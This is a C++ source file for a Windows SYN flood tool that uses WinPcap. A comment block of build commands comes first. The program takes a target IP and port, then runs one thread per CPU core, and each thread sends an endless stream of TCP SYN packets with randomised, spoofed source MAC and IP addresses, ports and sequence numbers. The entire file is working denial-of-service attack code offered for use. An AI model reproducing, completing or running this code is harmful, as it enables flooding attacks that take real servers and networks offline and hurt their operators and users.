/*

g++ synflood_gcc_mt.cpp -os.exe -lwsock32 -lwpcap -liphlpapi	
g++ synflood_gcc_mt.cpp -os.exe -lwsock32 -lwpcap -liphlpapi -lpthread		
g++ -os.exe synflood_gcc_mt.cpp -lwsock32 -lwpcap -liphlpapi  -lpthreadgc2 -static	
g++ -Wall -mwindows -Wl,-static  -os.exe synflood_gcc_mt.cpp -lwsock32 -lwpcap -liphlpapi  -lpthreadgc2  
g++ -Wall -mwindows -Wl,-static  -os.exe synflood_gcc_mt.cpp -lwsock32 -lwpcap -liphlpapi  -lpthreadgc2  -lgdi32 -lkernel32 -luser32 -lws2_32 
g++ -Wall -mwindows -Wl,-Bstatic -os.exe synflood_gcc_mt.cpp -lwsock32 -lwpcap -liphlpapi  -lpthreadgc2  -lgdi32 -lkernel32 -luser32 -lws2_32 
g++ -Wall -mwindows -Wl,-Bstatic,--enable-auto-import -os.exe synflood_gcc_mt.cpp -lwsock32 -lwpcap -liphlpapi  -lpthreadgc2  -lgdi32 -lkernel32 -luser32 -lws2_32 
g++ -Wall -mwindows -Wl,-Bstatic,--enable-auto-import -os.exe synflood_gcc_mt.cpp -lwsock32 -lwpcap -liphlpapi  -lpthreadgc2  -lgdi32 -lkernel32 -luser32 -lws2_32 
g++ -Wall -mwindows -Wl,-Bstatic,--enable-auto-import,--enable-stdcall-fixup -os.exe synflood_gcc_mt.cpp -lwsock32 -lwpcap -liphlpapi  -lpthreadgc2  -lgdi32 -lkernel32 -luser32 -lws2_32 
g++ -Wall -mwindows -Wl,-Bstatic,--enable-auto-import,--enable-stdcall-fixup -os.exe synflood_gcc_mt.cpp -LC:\MinGW\bin -lwsock32 -lwpcap -liphlpapi  -lpthreadgc2  -lgdi32 -lkernel32 -luser32 -lws2_32 
g++ -Wall -mwindows -static -Wl,-Bstatic,--enable-auto-import,--enable-stdcall-fixup -os.exe synflood_gcc_mt.cpp -lwsock32 -lwpcap -liphlpapi  -lpthreadgc2
g++ -Wall -mwindows -static -Wl,-Bstatic,--enable-auto-import,--enable-stdcall-fixup -os.exe synflood_gcc_mt.cpp -lwsock32 -lwpcap -liphlpapi  -lpthreadgc2
g++ -Wall -mwindows -Wl,-Bstatic,--enable-auto-import -os.exe synflood_gcc_mt.cpp -lwsock32 -lwpcap -liphlpapi  -lpthreadgc2
g++ -Wall -mwindows -static -Wl,-Bstatic,--enable-auto-import,--enable-stdcall-fixup -os.exe synflood_gcc_mt.cpp -lwsock32 -lwpcap -liphlpapi  -lpthreadgc2
g++  -os.exe s.cpp -lwsock32 -lwpcap -liphlpapi  -lpthreadgc2  -static-libgcc -static-libstdc++
g++  -Wl,--enable-auto-import -os.exe s.cpp -lwsock32 -lwpcap -liphlpapi  -lpthreadgc2  -lgcc -lstdc++
g++ -os.exe s.cpp -Wl,-Bstatic -lwsock32  -liphlpapi -lpthreadgc2 -lgcc -lstdc++ -Wl,-Bdynamic -lwpcap



g++ -osyn.exe syn.cpp -Wl,-Bstatic -lwsock32  -liphlpapi -lpthreadgc2 -Wl,-Bdynamic -lwpcap



*/


/*
#pragma comment(lib,	"ws2_32.lib")
#pragma comment(lib, 	"packet.lib")
#pragma comment(lib,	"wpcap.lib")
#pragma comment(lib, 	"Iphlpapi.lib")
#pragma comment(lib, 	"pthreadVC2.lib")
*/


#include "send.h"

#include <winsock2.h>
#include <iphlpapi.h>

#define HAVE_REMOTE
#include <pcap.h>
#include <pthread.h>

using namespace std;


void 	*fnSendPacket(void *arg);//线程运行方法
int 	 fnSendPacket(DEV_INFO dev,char* pcDstIpAddr,int nDstPort,char* pcBaseIpAddr);
int 	 fnSendPacket(DEV_INFO dev,char* cDstIp,int nDstPort);
int 	 fnCancelSending();

struct thread_param {
	DEV_INFO* 	dev;
	char*		pcDstIp;
	int*		pnDstPort;
	char*		pcBaseIp;
};

static bool 			FLOODING=true;
static pthread_t*  		P_THREAD_LIST;

int fnCancelSending(){
	FLOODING=false;
	fnCloseDevList();
	delete 		P_THREAD_LIST;
	printf("Free global variable...\n");  
	return 0;
}


void *fnSendPacket(void *arg){

	struct thread_param *pParamData;
   	pParamData = (struct thread_param *) arg;

	DEV_INFO* 	pDev 	=pParamData->dev;
	pcap_t* 	pHandle	=pDev->handle;
	
	char* 			pcDstIpAddr	=pParamData->pcDstIp;
	int* 			pnDstPort	=pParamData->pnDstPort;
	char*			pcBaseIpAddr=pParamData->pcBaseIp;



	byte packet[1024];
	memset(packet, 0x00, sizeof packet );
	int size = fnEncodePacket( packet, "0.0.0.0",0, pcDstIpAddr,*pnDstPort,pDev->szDevMac,pDev->szDevGatewayMac);

	byte psdPacket[128];
	memset(psdPacket, 0x00, sizeof psdPacket );

	

	ETHERNET_HEADER 	*pEtherentHeader 	= (ETHERNET_HEADER *)packet;
	IP_HEADER 			*pIpHeader 			= (IP_HEADER *)(packet + sizeof(ETHERNET_HEADER));
	TCP_HEADER 			*pTcpHeader 		= (TCP_HEADER *)(packet + sizeof(ETHERNET_HEADER) + sizeof(IP_HEADER));
	PSD_HEADER 			*pPsdHeader 		= (PSD_HEADER *)psdPacket;

	*(unsigned int *)(pPsdHeader->dstIpAddr) = inet_addr(pcDstIpAddr);
	*(unsigned short *)(pPsdHeader->tcpLen)  = htons(sizeof(TCP_HEADER));	
	pPsdHeader->protocol = PROTOCOL_TCP;
	pPsdHeader->padding  = 0x00;

	memcpy( psdPacket + sizeof(PSD_HEADER), pTcpHeader, sizeof(TCP_HEADER));


	unsigned short nSrcPort =  rand() %0xFFFFFFFF;
	unsigned int   unSrcIpAddr = 0;
	unsigned int   unBaseIpAddr = ntohl(inet_addr(pcBaseIpAddr));
	unsigned int   unSeq = 0;
	
	printf("\nBegin Flooding !\n");
	while ( FLOODING )
	//for(int l=0;l<10;l++)
	{
		for ( int i = 0; i < 6; ++i )
		{
			pEtherentHeader->srcMacAddr[i] = (byte)(rand() % (0xFF+1) );
		}

		unSeq = rand() % 0xFFFFFF;
		nSrcPort = rand() % 0xFFFF;
		unSrcIpAddr = unBaseIpAddr + rand() % 0xFF;
		

		*(unsigned int *)(pIpHeader->srcIpAddr) = htonl(unSrcIpAddr);
		*(unsigned short *)(pIpHeader->headerCheckSum) = 0x0000;
		*(unsigned short *)(pIpHeader->headerCheckSum) = fnCheckSum( ( unsigned short * )pIpHeader, sizeof (IP_HEADER));
		
		*(unsigned int *)(pPsdHeader->srcIpAddr) = htonl(unSrcIpAddr);
		
		TCP_HEADER *pPsdTcpHeader = (TCP_HEADER *)(psdPacket + sizeof(PSD_HEADER) );

		*(unsigned int *)(pPsdTcpHeader->seqNumber) = htonl(unSeq);
		*(unsigned int *)(pTcpHeader->seqNumber) = htonl(unSeq);//htonl(rand() % 0xFFFFFF );
		
		*(unsigned short *)(pTcpHeader->srcPort) = htons(nSrcPort);
		*(unsigned short *)(pPsdTcpHeader->srcPort) = htons(nSrcPort);

		*(unsigned short *)(pTcpHeader->checkSum) = 0x0000;
		*(unsigned short *)(pTcpHeader->checkSum) = fnCheckSum( (unsigned short *)psdPacket, sizeof(PSD_HEADER) + sizeof(TCP_HEADER) );

		
		
		pcap_sendpacket(pHandle, packet, size );

	}

	if(!FLOODING){
		delete  	pPsdHeader;
		delete  	pTcpHeader;
		delete  	pIpHeader;
		delete  	pEtherentHeader;
		printf("Free thread local variable...\n");  

	}

	
	return 0;
}



int fnSendPacket(DEV_INFO dev,char* pcDstIpAddr,int nDstPort,char* pcBaseIpAddr){

	
	struct thread_param param;
	param.dev=&dev;
	param.pcBaseIp=pcBaseIpAddr;
	param.pcDstIp=pcDstIpAddr;
	param.pnDstPort=&nDstPort;

	//fnSendSYNPacket((void*)&param);

	 
	int nCPUNum=fnGetCPUNum();
	P_THREAD_LIST=new pthread_t[nCPUNum];

	int rc;
	for(int i=0; i < nCPUNum; i++ ){
		rc = pthread_create(&P_THREAD_LIST[i], NULL,fnSendPacket, (void*)&param);
		//printf("Create thread succeed :%d\n",i );
      	if (rc){
         	printf("Error:unable to create thread :%d\n",i );
         	exit(-1);
      	}
	}
	
	//int nCPUNum=(sizeof(P_THREAD_LIST) / sizeof(P_THREAD_LIST[0]) - 1);
	for(int i=0; i < nCPUNum; i++ ){
		pthread_join(P_THREAD_LIST[i],NULL);
	}
	
	return 0;
}


int fnSendPacket(DEV_INFO dev,char* pcDstIp,int nDstPort){

	 
	int nGatewayIP =inet_addr( dev.szDevGatewayIP);

	byte byBaseIpAddr[4];
	byBaseIpAddr[0]=(u_char)(nGatewayIP);
 	byBaseIpAddr[1]=(u_char)(nGatewayIP>>8);
 	byBaseIpAddr[2]=(u_char)(nGatewayIP>>16);
 	byBaseIpAddr[3]=(u_char)(nGatewayIP>>24);

	char	cBaseIpAddr[32];
	sprintf(cBaseIpAddr,"%d.%d.%d.%d",byBaseIpAddr[0],byBaseIpAddr[1],byBaseIpAddr[2],byBaseIpAddr[3]);
	
	return fnSendPacket(dev,pcDstIp,nDstPort,cBaseIpAddr);
}




int main(int argc, char* argv[])
{


	printf("***********************************************************\n");
	printf("Use:\n");
	printf("syn target_ip target_port  src_base_ip\n");
	printf("***********************************************************\n");
	


	
	int nDevsNum=fnGetAllDevs(DEV_LIST);
 	for ( int i = 0; i < nDevsNum; ++i )  
    {  
    	printf("\n"); 
    	printf("%d:\n",i);
        DEV_INFO d=DEV_LIST[i];
        printf("Name:%s\n", d.szDevName);
        printf("Description:%s\n", d.szDevDescription);
        printf("IP:%s\n", d.szDevIP);

        printf("----------------------------------\n"); 

    }  

	
	DEV_INFO dev=DEV_LIST[0];


	char szError[PCAP_ERRBUF_SIZE];
	pcap_t *pHandle = pcap_open_live(dev.szDevName, 65536, 0, 1000, szError );
	if( NULL == pHandle )
	{
			printf("Error:Open adapter failed!\nPress any key to exit...");
			return -1;
	}
	
	fnGetGateway(dev.szDevIP,dev.szDevGatewayIP);
	
	memset(dev.szDevGatewayMac, 0, sizeof dev.szDevGatewayMac);
	fnGetGatewayMacAddr(pHandle,dev.szDevIP,dev.szDevGatewayIP,dev.szDevGatewayMac);
	
	memset(dev.szDevMac, 0, sizeof dev.szDevMac);
    fnGetSelfMacAddr(dev.szDevMac); 

    dev.handle=pHandle; 
	 

  	printf("\n");
  	printf("\n");
  	printf("Select:\n");
  	printf("***********************************************************\n");
	printf("Name:%s\n", dev.szDevName);
    printf("Description:%s\n", dev.szDevDescription);
    printf("IP:%s\n", dev.szDevIP);
    printf("Gateway IP:%s\n", dev.szDevGatewayIP);
    printf("Gateway Mac:%02x.%02x.%02x.%02x.%02x.%02x\n", 	dev.szDevGatewayMac[0],dev.szDevGatewayMac[1],dev.szDevGatewayMac[2],dev.szDevGatewayMac[3],dev.szDevGatewayMac[4],dev.szDevGatewayMac[5]);
    printf("***********************************************************\n");

	char pcDstIp[32];
	fnHostToIP(argv[1],pcDstIp);
	if(argc==4){
		fnSendPacket(dev,pcDstIp,atoi(argv[2]),argv[3]);
	}else{
		fnSendPacket(dev,pcDstIp,atoi(argv[2]));
 	}

 	

 	fnCancelSending();
	
	return 0;
}